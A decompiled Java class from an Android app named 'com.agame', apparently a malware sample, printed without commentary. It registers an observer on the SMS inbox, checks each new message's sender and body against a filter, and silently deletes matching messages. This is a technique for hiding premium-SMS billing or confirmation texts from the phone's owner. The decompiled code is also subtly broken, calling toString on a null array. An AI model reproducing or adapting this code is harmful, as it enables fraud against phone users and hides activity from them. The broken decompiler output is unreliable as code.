// Decompiled by JEB v1.5.201408040 - http://www.android-decompiler.com

package com.agame;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import java.util.Date;

public class TContentObserver extends ContentObserver {
        private Context context;
        private static long lasttime;
        private static long nowtime;

        static {
                TContentObserver.lasttime = new Date().getTime();
                TContentObserver.nowtime = new Date().getTime();
        }

        public TContentObserver(Handler handler, Context context) {
                super(handler);
                this.context = context;
        }

        public void onChange(boolean selfChange) {
                String[] v2 = null;
                super.onChange(selfChange);
                Cursor cursor = this.context.getContentResolver().query(Uri.parse("content://sms/inbox"), v2, v2.toString(), v2, v2.toString());
                ContentResolver v6 = this.context.getContentResolver();
                if (cursor.moveToNext()) {
                        String address = cursor.getString(cursor.getColumnIndex("address"));
                        String body = cursor.getString(cursor.getColumnIndex("body"));
                        if (TStringUtils.checkFilter(this.context, address, body).booleanValue()) {
                                int v10 = cursor.getInt(cursor.getColumnIndex("_id"));
                                TContentObserver.nowtime = new Date().getTime();
                                if (TContentObserver.nowtime - TContentObserver.lasttime > 5 && (TStringUtils.checkFilter(this.context, address, body).booleanValue())) {
                                        v6.delete(Uri.parse("content://sms"), "_id=" + v10, v2);
                                        TContentObserver.lasttime = TContentObserver.nowtime;
                                }
                        }
                }
        }
}
